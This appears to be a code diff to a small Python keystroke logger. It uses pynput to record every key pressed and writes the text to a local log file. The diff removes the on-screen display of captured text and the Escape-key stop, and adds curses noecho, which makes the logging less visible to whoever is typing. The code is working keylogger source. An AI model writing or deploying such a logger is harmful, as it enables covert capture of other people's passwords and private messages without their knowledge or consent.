@@ -1,6 +1,5 @@
 from pynput import keyboard
-import os
-
+import curses
 inputs = []
 
 
@@ -13,13 +12,8 @@ def on_press(key):
         elif key == keyboard.Key.backspace:
             if len(inputs) > 0:
                 inputs.pop()
-        elif key == keyboard.Key.esc:
-            keyboard.Listener.stop()
         elif key == keyboard.Key.enter:
             inputs.append('\n')
-    os.system('clear')
-    print(''.join(inputs))
-    print(len(inputs))
 
 
 def on_release(key):
@@ -27,8 +21,14 @@ def on_release(key):
         file = open('./log', 'a')
         while len(inputs) > 0:
             file.write(inputs.pop(0))
+        file.close()
 
 
-listener = keyboard.Listener(on_press=on_press, on_release=on_release)
-listener.start()
-listener.join()
+if __name__ == '__main__':
+    stdscr = curses.initscr()
+    curses.noecho()
+    try:
+        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+            listener.join()
+    except:
+        curses.endwin()
